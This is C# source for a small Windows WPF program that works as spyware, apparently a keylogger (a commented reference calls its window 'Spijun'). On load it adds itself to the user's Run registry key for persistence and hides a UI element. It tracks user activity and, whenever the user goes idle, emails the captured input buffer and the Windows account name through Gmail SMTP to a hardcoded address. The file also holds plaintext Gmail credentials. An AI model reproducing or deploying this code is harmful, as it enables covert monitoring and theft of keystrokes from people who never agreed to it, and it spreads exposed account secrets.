using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Windows.Forms;
using System.Windows.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net.Mail;
using System.Net;
using Microsoft.Win32;
using System.Security.Principal;

namespace WpfApplication69
{
    /// <summary>
    /// Interaction logic for Window1.xaml
    /// </summary>
    public partial class Window1 : Window
    {
        private ClientIdleHandler _clientIdleHandler;
        bool dal_idle = false;
        DispatcherTimer dt = new DispatcherTimer();
        Stopwatch stopWatch = new Stopwatch();
        string currentTime = string.Empty;

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AllocConsole();

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);


        TimeSpan ts3 = new TimeSpan(3000000000000);

        public Window1()
        {
            InitializeComponent();
            dt.Tick += new EventHandler(dt_Tick);
            dt.Interval = new TimeSpan(0, 0, 0, 0, 1);
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
         //   AllocConsole();
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (rkApp.GetValue("WpfApplication69") == null)
            {
                rkApp.SetValue("WpfApplication69", System.Windows.Forms.Application.ExecutablePath.ToString());
            }
            else
            {
          //      Console.WriteLine("postavljeno");
            }
            //IntPtr hWnd = FindWindow(null, "Spijun");
            //if (hWnd != IntPtr.Zero)
            //{
            //    //Hide the window
            //    ShowWindow(hWnd, 0); // 0 = SW_HIDE
            //}
            click();
            glava.Visibility = Visibility.Hidden;
            
        }

        void dt_Tick(object sender, EventArgs e)
        {
            if (stopWatch.IsRunning)
            {
                TimeSpan ts2 = new TimeSpan(3000000000000);
                TimeSpan ts = ts2 - stopWatch.Elapsed;
               
                currentTime = String.Format("{0:00}:{1:00}:{2:00}",
                    ts.Hours, ts.Minutes, ts.Seconds);
                textBlock2.Text = currentTime;
                textBlock1.Text = GetMousePositionWindowsForms().X.ToString() + " , " + GetMousePositionWindowsForms().Y.ToString();
                if (ts == new TimeSpan(0))
                {
                    stopWatch.Stop();
                   // mailaj2(_clientIdleHandler.pamcenje);
                   // Console.WriteLine(_clientIdleHandler.pamcenje);
                    _clientIdleHandler.Dispose();

                }

                if (_clientIdleHandler.IsActive)
                {
                    dal_idle = false;
                    ts3 = ts;

                  //  Console.WriteLine("radi? " + ts3.ToString() +" i "+ ts.Seconds.ToString());
                    //  Console.WriteLine("Active");
                    //reset IsActive flag
                    _clientIdleHandler.IsActive = false;


                   
                        
                      //if(Keyboard.IsKeyDown(Key.A)) Console.WriteLine("a");
                      //else if (Keyboard.IsKeyDown(Key.B)) Console.WriteLine("b");
                      //else if (Keyboard.IsKeyDown(Key.C)) Console.WriteLine("c");
                      //else if (Keyboard.IsKeyDown(Key.D)) Console.WriteLine("d");
                      //else if (Keyboard.IsKeyDown(Key.E)) Console.WriteLine("e");
                      //else if (Keyboard.IsKeyDown(Key.F)) Console.WriteLine("f");
                      //else if (Keyboard.IsKeyDown(Key.G)) Console.WriteLine("g");
                      //else if (Keyboard.IsKeyDown(Key.H)) Console.WriteLine("h");
                      //else if (Keyboard.IsKeyDown(Key.I)) Console.WriteLine("i");
                      //else if (Keyboard.IsKeyDown(Key.J)) Console.WriteLine("j");
                      //else if (Keyboard.IsKeyDown(Key.K)) Console.WriteLine("k");
                      //else if (Keyboard.IsKeyDown(Key.L)) Console.WriteLine("l");
                      //else if (Keyboard.IsKeyDown(Key.M)) Console.WriteLine("m");
                      //else if (Keyboard.IsKeyDown(Key.N)) Console.WriteLine("n");
                      //else if (Keyboard.IsKeyDown(Key.O)) Console.WriteLine("o");
                      //else if (Keyboard.IsKeyDown(Key.P)) Console.WriteLine("p");
                      //else if (Keyboard.IsKeyDown(Key.R)) Console.WriteLine("r");
                      //else if (Keyboard.IsKeyDown(Key.S)) Console.WriteLine("s");
                      //else if (Keyboard.IsKeyDown(Key.T)) Console.WriteLine("t");
                      //else if (Keyboard.IsKeyDown(Key.U)) Console.WriteLine("u");
                      //else if (Keyboard.IsKeyDown(Key.V)) Console.WriteLine("v");
                      //else if (Keyboard.IsKeyDown(Key.Z)) Console.WriteLine("z");
                      //else if (Keyboard.IsKeyDown(Key.X)) Console.WriteLine("x");
                      //else if (Keyboard.IsKeyDown(Key.Y)) Console.WriteLine("y");
                    
                    //if (_clientIdleHandler.IsClick == true)
                    //{

                    
                    //    //Console.WriteLine("kiflon " + mouseposition.ToString());
                       
                    //    stopWatch.Stop();
                    //    _clientIdleHandler.IsClick = false;
                    //}
                }
                else
                {
                   // Console.WriteLine("nnn? " + ts3.ToString() + " i " + ts.Seconds.ToString());

                    if (ts3 - ts > new TimeSpan(200000000) && dal_idle == false)
                    {
                     
                        mailaj2(_clientIdleHandler.pamcenje);
                        _clientIdleHandler.pamcenje = "";
                        dal_idle = true;
                    //    Console.WriteLine("Idle");
                    }
                }


            }
        }


        private void mailaj2(string Body)
        {

            MailMessage mail = new MailMessage();
            mail.To.Add("ristovski007@gmail.com");
            mail.From = new MailAddress("ristovski007@gmail.com");

            string subjekt = WindowsIdentity.GetCurrent().Name.ToString() + " - " + DateTime.Now.ToString(); 
           
            mail.Subject = subjekt;

          
            mail.Body = Body;

            mail.IsBodyHtml = false;

            SmtpClient sc = new SmtpClient("smtp.gmail.com");
            NetworkCredential nc = new NetworkCredential("ristovski007", "4835083090407");//username doesn't include @gmail.com
            sc.UseDefaultCredentials = false;
            sc.Credentials = nc;
            sc.EnableSsl = true;
            sc.Port = 587;
            try
            {
                sc.Send(mail);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }


        private void button1_Click(object sender, RoutedEventArgs e)
        {
            click();
           
        }

        private void click()
        {
            ts3 = new TimeSpan(3000000000000);
            if (_clientIdleHandler != null)
                _clientIdleHandler.Dispose();
            _clientIdleHandler = new ClientIdleHandler();
            _clientIdleHandler.Start();
            stopWatch.Reset();
            stopWatch.Start();
            dt.Start();
        }

        public Point GetMousePositionWindowsForms()
        {
            
            
            System.Drawing.Point point = System.Windows.Forms.Control.MousePosition;
            return new Point(point.X, point.Y);
        }

    }
}
